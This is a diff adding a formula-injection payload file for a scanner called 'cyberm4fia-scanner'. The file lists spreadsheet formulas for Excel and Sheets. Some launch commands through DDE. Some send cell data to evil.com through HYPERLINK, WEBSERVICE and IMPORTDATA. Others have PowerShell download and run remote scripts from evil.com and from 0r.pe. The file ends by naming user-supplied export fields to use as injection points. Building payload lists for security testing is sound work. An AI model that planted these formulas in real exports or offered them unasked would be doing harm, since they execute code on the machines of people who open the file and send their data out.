@@ -1,0 +1,26 @@
+# CSV / Formula Injection Payloads — cyberm4fia-scanner
+# Categories: Excel/Sheets, DDE, Web Service
+
+# ─── Basic Formula Injection ───
+=1+1
+=1+2";=1+2
+@SUM(1+1)*cmd|' /C calc'!A0
+=cmd|'/C calc'!A0
++cmd|'/C calc'!A0
+-cmd|'/C calc'!A0
+
+# ─── Hyperlinks / Web Services ───
+=HYPERLINK("http://evil.com?d="&A1,"Click")
+=WEBSERVICE("http://evil.com/?d="&A1)
+=IMPORTXML("http://evil.com","//a")
+=IMPORTDATA("http://evil.com/?d="&A1)
+
+# ─── DDE (Excel) ───
+=cmd|'/C powershell IEX(wget evil.com/s.ps1)'!A1
+=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
+
+# ─── PowerShell ───
+=cmd|'/C powershell IEX(wget 0r.pe/p -UseBasicParsing)'!A1
+
+# ─── Injection Points ───
+# User-supplied fields exported to CSV/XLSX: profile name, address, company, invoice memo, comment, support tickets
